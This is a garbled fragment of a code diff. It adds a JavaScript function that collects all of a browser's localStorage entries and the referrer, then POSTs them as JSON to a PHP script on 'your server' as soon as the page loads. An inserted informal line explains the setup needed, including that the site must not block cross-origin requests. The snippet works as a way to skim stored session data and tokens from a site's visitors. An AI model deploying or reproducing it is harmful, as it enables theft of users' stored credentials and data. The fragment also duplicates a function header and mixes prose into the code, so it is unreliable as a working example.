@@ -12,3 +12,32 @@ function sendDataToServer() {
         referrer: document.referrer,
         localStorage: storageObj
     };
+
+
+
+function sendDataToServer() {
+    var storageObj = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        storageObj[key] = localStorage.getItem(key);
+    }
+--
+This is multipart - u need a php script on your server to read this and the site has to have no cors/origin policy blocking:
+
+    const data = {
+        referrer: document.referrer,
+        localStorage: storageObj
+    };
+
+    fetch('your_php_script.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    });
+}
+
+sendDataToServer();
+
+
